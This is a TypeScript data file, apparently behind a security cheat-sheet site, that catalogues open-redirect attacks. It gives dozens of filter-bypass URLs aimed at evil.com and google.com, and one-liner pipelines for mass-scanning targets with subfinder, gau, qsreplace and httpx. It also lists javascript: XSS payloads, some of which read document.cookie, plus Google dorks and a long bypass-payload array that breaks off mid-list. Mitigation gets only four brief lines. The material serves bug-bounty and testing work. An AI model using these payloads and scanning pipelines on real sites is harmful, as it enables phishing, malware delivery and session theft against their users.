export interface OpenRedirectCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const lastUpdated = "2026-05-15"
export const pageDescription = "Open redirect vulnerability testing with various protocols, parameters, and bypass techniques."

export const openRedirectCategories: OpenRedirectCategory[] = [
  // =================== INTRODUCTION ==================
  {
    category: "Introduction",
    commands: [
      {
        command: "Open Redirect = vulnerability allowing attackers to redirect users to malicious websites",
        description: "What is Open Redirect?",
      },
      {
        command: "Occurs when web app accepts user input for URLs without proper validation",
        description: "Root cause of the vulnerability",
      },
      {
        command: "Consequences: Phishing, malware distribution, session hijacking",
        description: "Potential impacts even from simple redirects",
      },
    ],
  },

  // =================== UNDERSTANDING BASICS ==================
  {
    category: "Understanding Open Redirect Basics",
    commands: [
      {
        command: "https://example.com/redirect?url=http://malicious.com",
        description: "Basic example of an open redirect URL",
      },
    ],
  },

  // =================== MANUAL TESTING TECHNIQUES ==================
  {
    category: "Manual Testing 1: Simply Change the Domain",
    commands: [
      {
        command: "?redirect=https://example.com → ?redirect=https://evil.com",
        description: "#1 Most basic bypass - replace target domain with malicious one",
      },
    ],
  },
  {
    category: "Manual Testing 2: Bypass Protocol Blacklist",
    commands: [
      {
        command: "?redirect=https://example.com → ?redirect=//evil.com",
        description: "#2 Bypass when protocol (https://) is blacklisted",
      },
    ],
  },
  {
    category: "Manual Testing 3: Bypass Double Slash Blacklist",
    commands: [
      {
        command: "?redirect=https://example.com → ?redirect=\\\\evil.com",
        description: "#3 Bypass when double slash (//) is blacklisted",
      },
    ],
  },
  {
    category: "Manual Testing 4: Bypass Using http: or https:",
    commands: [
      {
        command: "?redirect=https://example.com → ?redirect=https:example.com",
        description: "#4 Bypass by omitting slashes after protocol",
      },
    ],
  },
  {
    category: "Manual Testing 5: Bypass Using %40 (At Symbol)",
    commands: [
      {
        command: "?redirect=example.com → ?redirect=example.com%40evil.com",
        description: "#5 Use encoded @ symbol to bypass domain checks",
      },
    ],
  },
  {
    category: "Manual Testing 6: Bypass Only Checking Domain Name",
    commands: [
      {
        command: "?redirect=example.com → ?redirect=example.comevil.com",
        description: "#6 Append attacker domain to end of target domain",
      },
    ],
  },
  {
    category: "Manual Testing 7: Bypass Using Dot Encoding %2e",
    commands: [
      {
        command: "?redirect=example.com → ?redirect=example.com%2eevil.com",
        description: "#7 Use encoded dot to bypass domain filters",
      },
    ],
  },
  {
    category: "Manual Testing 8: Bypass Using Question Mark",
    commands: [
      {
        command: "?redirect=example.com → ?redirect=evil.com?example.com",
        description: "#8 Use query string to obscure original domain",
      },
    ],
  },
  {
    category: "Manual Testing 9: Bypass Using Hash %23",
    commands: [
      {
        command: "?redirect=example.com → ?redirect=evil.com%23example.com",
        description: "#9 Use fragment to hide malicious domain",
      },
    ],
  },
  {
    category: "Manual Testing 10: Bypass Using Symbol",
    commands: [
      {
        command: "?redirect=example.com → ?redirect=example.com/evil.com",
        description: "#10 Use path separator to add malicious domain",
      },
    ],
  },
  {
    category: "Manual Testing 11: Bypass Using Chinese Dot %E3%80%82",
    commands: [
      {
        command: "?redirect=example.com → ?redirect=evil.com%E3%80%82%23example.com",
        description: "#11 Use Unicode-encoded Chinese dot to bypass filters",
      },
    ],
  },
  {
    category: "Manual Testing 12: Bypass Using Null Byte %0d/%0a",
    commands: [
      {
        command: "?redirect=/ → ?redirect=/%0d/evil.com",
        description: "#12 Inject null bytes to break validation",
      },
    ],
  },
  {
    category: "Manual Testing 13: Encoded URL Redirects",
    commands: [
      {
        command: "https://example.com/redirect?url=http%3A%2F%2Fmalicious.com",
        description: "#13 Use full URL encoding to bypass filters",
      },
    ],
  },
  {
    category: "Manual Testing 14: Path-Based Redirects",
    commands: [
      {
        command: "https://example.com/redirect/http://malicious.com",
        description: "#14 Use path-style redirects instead of query parameters",
      },
    ],
  },
  {
    category: "Manual Testing 15: Data URI Redirects",
    commands: [
      {
        command: "https://example.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnVGhpcyBpcyBhbiBhdHRhY2snKTwvc2NyaXB0Pg==",
        description: "#15 Use data URIs to execute arbitrary content",
      },
    ],
  },
  {
    category: "Manual Testing 16: JavaScript Scheme Redirects",
    commands: [
      {
        command: "https://example.com/redirect?url=javascript:alert('XSS');//",
        description: "#16 Use javascript: scheme to execute JS",
      },
    ],
  },
  {
    category: "Manual Testing 17: Open Redirect via HTTP Header",
    commands: [
      {
        command: `Location: http://malicious.com
X-Forwarded-Host: evil.com
Refresh: 0; url=http://malicious.com`,
        description: "#17 Inject redirect headers directly",
      },
    ],
  },
  {
    category: "Manual Testing 18: Path Traversal Hybrids",
    commands: [
      {
        command: "/redirect?url=/../../https://evil.com",
        description: "#18 Combine path traversal with redirect",
      },
    ],
  },
  {
    category: "Manual Testing 19: SVG Payload",
    commands: [
      {
        command: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://evil.com/'" xmlns="http://www.w3.org/2000/svg"></svg>`,
        description: "#19 Use SVG with onload to redirect",
      },
    ],
  },
  {
    category: "Manual Testing 20: Case-Sensitive Variations",
    commands: [
      {
        command: "//GOOGLE.com/ → Bypass case-sensitive filters",
        description: "#20 Use random casing to evade blacklists",
      },
      {
        command: "//GoOgLe.com/ → More random casing variations",
        description: "#20 Variant with mixed casing",
      },
    ],
  },
  {
    category: "Manual Testing 21: Trailing Special Characters",
    commands: [
      {
        command: "//google.com/#/ → Fragment to obscure redirect",
        description: "#21 Use trailing fragment",
      },
      {
        command: "//google.com/;&/ → Extra special characters",
        description: "#21 Variant with ampersands",
      },
    ],
  },
  {
    category: "Manual Testing 22: IP Address Variants",
    commands: [
      {
        command: "http://3232235777 → Decimal IP for 192.168.1.1",
        description: "#22 Use decimal encoding for IP",
      },
      {
        command: "http://0xC0A80001 → Hexadecimal IP",
        description: "#22 Variant with hex encoding",
      },
    ],
  },
  {
    category: "Manual Testing 23: IPv6 Notation",
    commands: [
      {
        command: "http://[::1]/ → IPv6 loopback",
        description: "#23 Use IPv6 notation to bypass filters",
      },
      {
        command: "http://[::ffff:192.168.1.1]/ → IPv4-mapped IPv6",
        description: "#23 Variant with IPv4-mapped IPv6",
      },
    ],
  },
  {
    category: "Manual Testing 24: Non-Standard Ports",
    commands: [
      {
        command: "http://google.com:81 → Different port",
        description: "#24 Use non-standard ports to bypass filters",
      },
      {
        command: "https://google.com:444 → HTTPS on different port",
        description: "#24 Variant with HTTPS port",
      },
    ],
  },
  {
    category: "Manual Testing 25: Unicode Obfuscation in Paths",
    commands: [
      {
        command: "/%E2%80%http://8Egoogle.com → Unicode injection",
        description: "#25 Inject Unicode characters to break parsing",
      },
      {
        command: "/%C2%http://A0google.com → More unicode obfuscation",
        description: "#25 Variant with different Unicode bytes",
      },
    ],
  },

  // =================== AUTOMATED TOOLS ==================
  {
    category: "Automated Tools 1: Reconnaissance (Single Domain)",
    commands: [
      {
        command: `echo target.com | gau --o urls1.txt
echo target.com | katana -d 2 -o urls2.txt
echo target.com | urlfinder -o urls3.txt
echo target.com | hakrawler > urls4.txt`,
        description: "Collect URLs from multiple sources for single domain",
      },
    ],
  },
  {
    category: "Automated Tools 2: Reconnaissance (Multiple Subdomains)",
    commands: [
      {
        command: `subfinder -d target.com -all -o subdomains1.txt
assetfinder --subs-only target.com > subdomains2.txt
sort -u subdomains.txt subdomains2.txt -o uniqsubs.txt
cat uniqsubs.txt | httpx-toolkit -o finallist.txt`,
        description: "Collect all subdomains first, then gather URLs",
      },
    ],
  },
  {
    category: "Automated Tools 3: Filtering URLs for Redirect Parameters",
    commands: [
      {
        command: `cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt`,
        description: "Filter URLs containing common redirect parameters",
      },
      {
        command: `final.txt | gf redirect | uro | sort -u | tee redirect_params.txt`,
        description: "More effective approach using gf tool pattern",
      },
      {
        command: "https://github.com/coffinxp/GFpattren/blob/main/redirect.json",
        description: "CoffinXP GF pattern for redirect parameters",
      },
    ],
  },
  {
    category: "Automated Tools 4: Final Exploitation Phase",
    commands: [
      {
        command: `cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"`,
        description: "Test all filtered URLs with evil.com payload",
      },
      {
        command: `subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"`,
        description: "One-liner for single target domain",
      },
    ],
  },
  {
    category: "Automated Tools 5: Bypass Payloads Testing",
    commands: [
      {
        command: `cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"`,
        description: "Test all bypass payloads from custom list",
      },
    ],
  },
  {
    category: "Automated Tools 6: Fuzzing with FFUF",
    commands: [
      {
        command: `ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD -u "https://site.com/bitrix/redirect.php?PARAM=PAYLOAD" -mc 301,302,303,307,308 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -x http://localip:8080 -t 10 -mr "Location: http://google.com"`,
        description: "Fuzz redirect parameters with bypass payloads, proxy to Burp",
      },
    ],
  },
  {
    category: "Automated Tools 7: Testing with CURL",
    commands: [
      {
        command: `cat urls.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\\n" {}`,
        description: "Mass test open redirects with CURL",
      },
    ],
  },
  {
    category: "Automated Tools 8: Nuclei Template",
    commands: [
      {
        command: `echo subdomains.txt | nuclei -t openRedirect.yaml -c 30`,
        description: "Automated scanning with Nuclei open redirect template",
      },
    ],
  },
  {
    category: "Automated Tools 9: VirusTotal",
    commands: [
      {
        command: `https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=target.com`,
        description: "Use VirusTotal API to find redirect URLs",
      },
      {
        command: `./virustotal.sh domains.txt | gf redirect`,
        description: "Process VirusTotal results with gf",
      },
      {
        command: "https://github.com/coffinxp/loxs/blob/main/payloads/or.txt",
        description: "Custom bypass payloads list",
      },
    ],
  },
  {
    category: "Automated Tools 10: Loxs Tool",
    commands: [
      {
        command: `cat urls.txt | sed 's/=.*/=/' | uro >final.txt`,
        description: "Prepare URLs for Loxs tool",
      },
      {
        command: "Use Loxs tool for automatic open redirect detection with no false positives",
        description: "Simpler way to find open redirects",
      },
    ],
  },

  // =================== OPEN REDIRECT TO XSS (ATO) ==================
  {
    category: "Open Redirect to XSS (ATO) - Increase Impact",
    commands: [
      {
        command: `javascript:alert(1)`,
        description: "#Basic payload, javascript code executed after 'javascript:'",
      },
      {
        command: `java%0d%0ascript%0d%0a:alert(0)`,
        description: "#Bypass 'javascript' word filter with CRLF",
      },
      {
        command: `javascript://%250Aalert(1)`,
        description: "#Javascript with '://' + double encoding, bypasses PHP FILTER_VALIDATE_URL",
      },
      {
        command: `javascript://%250Aalert(1)//?1`,
        description: "#Variation with query string using comments/ternary operator",
      },
      {
        command: `%09Jav%09ascript:alert(document.domain)`,
        description: "#Tab-separated javascript to bypass filters",
      },
      {
        command: `javascript://%250Alert(document.location=document.cookie)`,
        description: "#Capitalized 'Alert' to evade case-sensitive filters",
      },
      {
        command: `/%09/javascript:alert(1);`,
        description: "#Path-based javascript injection",
      },
      {
        command: `//%5cjavascript:alert(1);`,
        description: "#Using encoded backslash to bypass filters",
      },
      {
        command: `javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)`,
        description: "#Mixed case + CRLF to bypass filters",
      },
      {
        command: `javascript:confirm(1)`,
        description: "#Variant with confirm() instead of alert()",
      },
      {
        command: `javascript://https://whitelisted.com/?z=%0Aalert(1)`,
        description: "#Bypass whitelist by hiding payload in query string",
      },
      {
        command: `jaVAscript://whitelisted.com//%0d%0aalert(1);//`,
        description: "#Advanced whitelist bypass with CRLF",
      },
      {
        command: `javascript://whitelisted.com?%a0alert%281%29`,
        description: "#Using encoded spaces in payload",
      },
      {
        command: `/x:1/:///%01javascript:alert(document.cookie)/`,
        description: "#Obscure path-based payload",
      },
    ],
  },

  // =================== GOOGLE DORKING ==================
  {
    category: "Google Dorking & Automation",
    commands: [
      {
        command: `site:target (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&)`,
        description: "Google dork to find URLs with redirect parameters",
      },
      {
        command: `inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:target`,
        description: "Simplified dork for specific target",
      },
      {
        command: `cat urls.txt| gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"`,
        description: "Process dork results with gf + qsreplace + httpx",
      },
      {
        command: `cat urls.txt| gf redirect | uro | while read url; do cat /home/coffinxp/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"`,
        description: "Test all bypass payloads on dork results",
      },
    ],
  },

  // =================== RISKS AND IMPACTS ==================
  {
    category: "Risks and Impacts",
    commands: [
      {
        command: "Phishing Attacks: Users tricked into entering credentials on fake websites",
        description: "Most common impact - steal user credentials",
      },
      {
        command: "Malware Distribution: Redirecting to sites that automatically download malware",
        description: "Spread malware via trusted domain redirects",
      },
      {
        command: "Session Hijacking: Stealing session cookies through crafted URLs",
        description: "Take over user accounts via session theft",
      },
    ],
  },

  // =================== BUG BOUNTY PAYOUTS ==================
  {
    category: "Bug Bounty Payouts",
    commands: [
      {
        command: "Small Websites: $50 — $200",
        description: "Payout range for small targets",
      },
      {
        command: "Mid-Sized Companies: $200 — $500",
        description: "Payout range for medium targets",
      },
      {
        command: "Big Corporations: $500 — $1000",
        description: "Payout range for large targets",
      },
      {
        command: "Open Redirect to ATO: $1000 — $5000",
        description: "Higher payout when chained to account takeover",
      },
    ],
  },

  // =================== MITIGATION ==================
  {
    category: "How to Prevent",
    commands: [
      {
        command: "#1: Whitelist URLs - Restrict redirection to trusted domains only",
        description: "Most effective prevention method",
      },
      {
        command: "#2: Use Relative Paths - Ditch full URLs for safer relative paths",
        description: "Avoid full URLs in redirect parameters",
      },
      {
        command: "#3: Validate Inputs - Block any unknown or suspicious redirect values",
        description: "Strict input validation for redirect parameters",
      },
      {
        command: "#4: Show Warnings - Notify users before redirecting to external websites",
        description: "User awareness before external redirects",
      },
    ],
  },

  // =================== CONCLUSION ==================
  {
    category: "Conclusion",
    commands: [
      {
        command: "Open Redirect vulnerabilities remain a critical threat to web application security",
        description: "Final takeaway",
      },
      {
        command: "By understanding technical aspects, detection methods, and prevention strategies, developers and security researchers can effectively mitigate risks",
        description: "Summary of key points",
      },
    ],
  },
]

export const openRedirectTools = [
  {
    name: "gau",
    url: "https://github.com/lc/gau",
    description: "Fetch URLs from AlienVault OTX, Wayback Machine, Common Crawl",
  },
  {
    name: "katana",
    url: "https://github.com/projectdiscovery/katana",
    description: "Next-generation crawling and spidering framework",
  },
  {
    name: "gf",
    url: "https://github.com/tomnomnom/gf",
    description: "Filter URLs by vulnerability type (redirect patterns)",
  },
  {
    name: "qsreplace",
    url: "https://github.com/tomnomnom/qsreplace",
    description: "Replace query string values in URLs",
  },
  {
    name: "httpx-toolkit",
    url: "https://github.com/projectdiscovery/httpx",
    description: "Fast HTTP toolkit for probing URLs",
  },
  {
    name: "Nuclei Templates",
    url: "https://github.com/projectdiscovery/nuclei-templates/blob/master/http/misconfiguration/open-redirect.yaml",
    description: "Official Nuclei template for open redirect",
  },
  {
    name: "Loxs Tool",
    url: "https://github.com/coffinxp/loxs",
    description: "Automatic open redirect detection with no false positives",
  },
  {
    name: "VirusTotal API",
    url: "https://developers.virustotal.com/reference/domain-report",
    description: "Use VirusTotal to find redirect URLs",
  },
]

export const bypassPayloads = [
  // %2f.. (slash-encoded path traversal)
  "//google.com/%2f..",
  "//www.whitelisteddomain.tld@google.com/%2f..",
  "///google.com/%2f..",
  "///www.whitelisteddomain.tld@google.com/%2f..",
  "////google.com/%2f..",
  "////www.whitelisteddomain.tld@google.com/%2f..",
  "https://google.com/%2f..",
  "https://www.whitelisteddomain.tld@google.com/%2f..",
  "/https://google.com/%2f..",
  "/https://www.whitelisteddomain.tld@google.com/%2f..",

  // %2f%2e%2e (double-encoded ../)
  "//www.google.com/%2f%2e%2e",
  "//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "///www.google.com/%2f%2e%2e",
  "///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "////www.google.com/%2f%2e%2e",
  "////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "https://www.google.com/%2f%2e%2e",
  "https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "/https://www.google.com/%2f%2e%2e",
  "/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",

  // trailing slash /
  "//google.com/",
  "//www.whitelisteddomain.tld@google.com/",
  "///google.com/",
  "///www.whitelisteddomain.tld@google.com/",
  "////google.com/",
  "////www.whitelisteddomain.tld@google.com/",
  "https://google.com/",
  "https://www.whitelisteddomain.tld@google.com/",
  "/https://google.com/",
  "/https://www.whitelisteddomain.tld@google.com/",

  // trailing //
  "//google.com//",
  "//www.whitelisteddomain.tld@google.com//",
  "///google.com//",
  "///www.whitelisteddomain.tld@google.com//",
  "////google.com//",
  "////www.whitelisteddomain.tld@google.com//",
  "https://google.com//",
  "https://www.whitelisteddomain.tld@google.com//",
  "//https://google.com//",
  "//https://www.whitelisteddomain.tld@google.com//",

  // %2e%2e%2f (encoded ../)
  "//www.google.com/%2e%2e%2f",
  "//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",
  "///www.google.com/%2e%2e%2f",
  "///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",
  "////www.google.com/%2e%2e%2f",
  "////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",
  "https://www.google.com/%2e%2e%2f",
  "https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",
  "//https://www.google.com/%2e%2e%2f",
  "//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f",

  // %2e%2e (encoded ..)
  "///www.google.com/%2e%2e",
  "///www.whitelisteddomain.tld@www.google.com/%2e%2e",
  "////www.google.com/%2e%2e",
  "////www.whitelisteddomain.tld@www.google.com/%2e%2e",
  "https:///www.google.com/%2e%2e",
  "https:///www.whitelisteddomain.tld@www.google.com/%2e%2e",
  "//https:///www.google.com/%2e%2e",
  "//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e",
  "/https://www.google.com/%2e%2e",
  "/https://www.whitelisteddomain.tld@www.google.com/%2e%2e",

  // %2f%2e%2e (mixed encode)
  "///www.google.com/%2f%2e%2e",
  "///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "////www.google.com/%2f%2e%2e",
  "////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "https:///www.google.com/%2f%2e%2e",
  "https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "/https://www.google.com/%2f%2e%2e",
  "/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
  "/https:///www.google.com/%2f%2e%2e",
  "/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",

  // %09 (tab) prefix
  "/%09/google.com",
  "/%09/www.whitelisteddomain.tld@google.com",
  "//%09/google.com",
  "//%09/www.whitelisteddomain.tld@google.com",
  "///%09/google.com",
  "///%09/www.whitelisteddomain.tld@google.com",
  "////%09/google.com",
  "////%09/www.whitelisteddomain.tld@google.com",
  "https://%09/google.com",
  "https://%09/www.whitelisteddomain.tld@google.com",

  // %5c (backslash) prefix
  "/%5cgoogle.com",
  "/%5cwww.whitelisteddomain.tld@google.com",
  "//%5cgoogle.com",
  "//%5cwww.whitelisteddomain.tld@google.com",
  "///%5cgoogle.com",
  "///%5cwww.whitelisteddomain.tld@google.com",
  "////%5cgoogle.com",
  "////%5cwww.whitelisteddomain.tld@google.com",
  "https://%5cgoogle.com",
  "https://%5cwww.whitelisteddomain.tld@google.com",
  "/https://%5cgoogle.com",
  "/https://%5cwww.whitelisteddomain.tld@google.com",

  // plain host
  "https://google.com",
  "https://www.whitelisteddomain.tld@google.com",

  // javascript: payloads
  "javascript:alert(1);",
  "javascript:alert(1)",
  "//javascript:alert(1);",
  "/javascript:alert(1);",
  "//javascript:alert(1)",
  "/javascript:alert(1)",
  "/%5cjavascript:alert(1);",
  "/%5cjavascript:alert(1)",
  "//%5cjavascript:alert(1);",
  "//%5cjavascript:alert(1)",
  "/%09/javascript:alert(1);",
  "/%09/javascript:alert(1)",
  "java%0d%0ascript%0d%0a:alert(0)",
  "//google.com",
  "https:google.com",
  "//google%E3%80%82com",
  "\\/\\/google.com/",
  "/\\/google.com/",
  "//google%00.com",
  "https://www.whitelisteddomain.tld/https://www.google.com/",
  '\";alert(0);//',
  "javascript://www.whitelisteddomain.tld?%a0alert%281%29",

  // hex IP obfuscation
  "http://0xd8.0x3a.0xd6.0xce",
  "http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce",
  "http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce",
  "http://XY>.7d8T\\205pZM@0xd8.0x3a.0xd6.0xce",
  "http://0xd83ad6ce",
  "http://www.whitelisteddomain.tld@0xd83ad6ce",
  "http://3H6k7lIAiqjfNeN@0xd83ad6ce",
  "http://XY>.7d8T\\205pZM@0xd83ad6ce",
  "http://3627734734",
  "http://www.whitelisteddomain.tld@3627734734",
  "http://3H6k7lIAiqjfNeN@3627734734",
  "http://XY>.7d8T\\205pZM@3627734734",
  "http://472.314.470.462",
  "http://www.whitelisteddomain.tld@472.314.470.462",
  "http://3H6k7lIAiqjfNeN@472.314.470.462",
  "http://XY>.7d8T\\205pZM@472.314.470.462",

  // octal IP obfuscation
  "http://0330.072.0326.0316",
  "http://www.whitelisteddomain.tld@0330.072.0326.0316",
  "http://3H6k7lIAiqjfNeN@0330.072.0326.0316",
  "http://XY>.7d8T\\205pZM@0330.072.0326.0316",
  "http://00330.00072.0000326.00000316",
  "http://www.whitelisteddomain.tld@00330.00072.0000326.00000316",
  "http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316",
  "http://XY>.7d8T\\205pZM@00330.00072.0000326.00000316",

  // IPv6 IP obfuscation
  "http://[::216.58.214.206]",
  "http://www.whitelisteddomain.tld@[::216.58.214.206]",
  "http://3H6k7lIAiqjfNeN@[::216.58.214.206]",
  "http://XY>.7d8T\\205pZM@[::216.58.214.206]",
  "http://[::ffff:216.58.214.206]",
  "http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]",
  "http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]",
  "http://XY>.7d8T\\205pZM@[::ffff:216.58.214.206]",

  // mixed base IP
  "http://0xd8.072.54990",
  "http://www.whitelisteddomain.tld@0xd8.072.54990",
  "http://3H6k7lIAiqjfNeN@0xd8.072.54990",
  "http://XY>.7d8T\\205pZM@0xd8.072.54990",
  "http://0xd8.3856078",
  "http://www.whitelisteddomain.tld@0xd8.3856078",
  "http://3H6k7lIAiqjfNeN@0xd8.3856078",
  "http://XY>.7d8T\\205pZM@0xd8.3856078",
  "http://00330.3856078",
  "http://www.whitelisteddomain.tld@00330.3856078",
  "http://3H6k7lIAiqjfNeN@00330.3856078",
  "http://XY>.7d8T\\205pZM@00330.3856078",
  "http://00330.0x3a.54990",
  "http://www.whitelisteddomain.tld@00330.0x3a.54990",
  "http://3H6k7lIAiqjfNeN@00330.0x3a.54990",
  "http://XY>.7d8T\\205pZM@00330.0x3a.54990",

  // http: (no //) IP obfuscation
  "http:0xd8.0x3a.0xd6.0xce",
  "http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce",
  "http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce",
  "http:XY>.7d8T\\205pZM@0xd8.0x3a.0xd6.0xce",
  "http:0xd83ad6ce",
  "http:www.whitelisteddomain.tld@0xd83ad6ce",
  "http:3H6k7lIAiqjfNeN@0xd83ad6ce",
  "http:XY>.7d8T\\205pZM@0xd83ad6ce",
  "http:3627734734",
  "http:www.whitelisteddomain.tld@3627734734",
  "http:3H6k7lIAiqjfNeN@3627734734",
  "http:XY>.7d8T\\205pZM@3627734734",
  "http:472.314.470.462",
  "http:www.whitelisteddomain.tld@472.314.470.462",
  "http:3H6k7lIAiqjfNeN@472.314.470.462",
  "http:XY>.7d8T\\205pZM@472.314.470.462",
  "http:0330.072.0326.0316",
  "http:www.whitelisteddomain.tld@0330.072.0326.0316",
  "http:3H6k7lIAiqjfNeN@0330.072.0326.0316",
  "http:XY>.7d8T\\205pZM@0330.072.0326.0316",
  "http:00330.00072.0000326.00000316",
  "http:www.whitelisteddomain.tld@00330.00072.0000326.00000316",
  "http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316",
  "http:XY>.7d8T\\205pZM@00330.00072.0000326.00000316",
  "http:[::216.58.214.206]",
  "http:www.whitelisteddomain.tld@[::216.58.214.206]",
  "http:3H6k7lIAiqjfNeN@[::216.58.214.206]",
  "http:XY>.7d8T\\205pZM@[::216.58.214.206]",
  "http:[::ffff:216.58.214.206]",
  "http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]",
  "http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]",
  "http:XY>.7d8T\\205pZM@[::ffff:216.58.214.206]",
  "http:0xd8.072.54990",
  "http:www.whitelisteddomain.tld@0xd8.072.54990",
  "http:3H6k7lIAiqjfNeN@0xd8.072.54990",
  "http:XY>.7d8T\\205pZM@0xd8.072.54990",
  "http:0xd8.3856078",
  "http:www.whitelisteddomain.tld@0xd8.3856078",
  "http:3H6k7lIAiqjfNeN@0xd8.3856078",
  "http:XY>.7d8T\\205pZM@0xd8.3856078",
  "http:00330.3856078",
  "http:www.whitelisteddomain.tld@00330.3856078",
  "http:3H6k7lIAiqjfNeN@00330.3856078",
  "http:XY>.7d8T\\205pZM@00330.3856078",
  "http:00330.0x3a.54990",
  "http:www.whitelisteddomain.tld@00330.0x3a.54990",
  "http:3H6k7lIAiqjfNeN@00330.0x3a.54990",
  "http:XY>.7d8T\\205pZM@00330.0x3a.54990",

  // unicode confinement / homoglyphs
  "\u3031google.com",
  "\u3035google.com",
  "\u309dgoogle.com",
  "\u30fcgoogle.com",
  "\uff70google.com",
  "/\u3031google.com",
  "/\u3035google.com",
  "/\u309dgoogle.com",
  "/\u30fcgoogle.com",
  "/\uff70google.com",

  // hex-encoded full URL
  "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
  "http://%67%6f%6f%67%6c%65%2e%63%6f%6d",

  // HTML-tag wrapped
  "<>javascript:alert(1);",
  "<>//google.com",

  // @ delimiter bypass
  "//google.com\\@www.whitelisteddomain.tld",
  "https://:@google.com\\@www.whitelisteddomain.tld",

  // escape sequences
  "\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)",
  "\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)",
  "ja\\nva\\tscript\\r:alert(1)",
  "\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)",
  "\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)",

  // port / param / fragment tricks
  "http://google.com:80#@www.whitelisteddomain.tld/",
  "http://google.com:80?@www.whitelisteddomain.tld/",
  "http://google.com\\www.whitelisteddomain.tld",
  "http://google.com&www.whitelisteddomain.tld",
  "http:///////////google.com",
  "\\\\google.com",
  "http://www.whitelisteddomain.tld.google.com",
  "/http://example.com",
  "/%5cexample.com",
  "/%2f%2fexample.com",
  "/example.com/%2f%2e%2e",
  "/http:/example.com",
  "/.example.com",
  "///\\;@example.com",
  "///example.com/",
  "///example.com",
  "///example.com/%2f..",
  "/////example.com/",
  "/////example.com",
  "/%09/example.com",
  "/%2f%2fexample.com",
  "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
  "/%5cexample.com",
  "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
  "/.example.com",
  "//%09/example.com",
  "//%5cexample.com",
  "///%09/example.com",
  "///%5cexample.com",
  "////%09/example.com",
  "////%5cexample.com",
  "/////example.com",
  "/////example.com/",
  "////\\;@example.com",
  "////example.com/",
  "////example.com/%2e%2e",
  "////example.com/%2e%2e%2f",
  "////example.com/%2f%2e%2e",
  "////example.com/%2f..",
  "////example.com//",
  "///\\;@example.com",
  "///example.com",
  "///example.com/",
  "///example.com/%2e%2e",
  "///example.com/%2e%2e%2f",
  "///example.com/%2f%2e%2e",
  "///example.com/%2f..",
  "///example.com//",
  "//example.com",
  "//example.com/",
  "//example.com/%2e%2e",
  "//example.com/%2e%2e%2f",
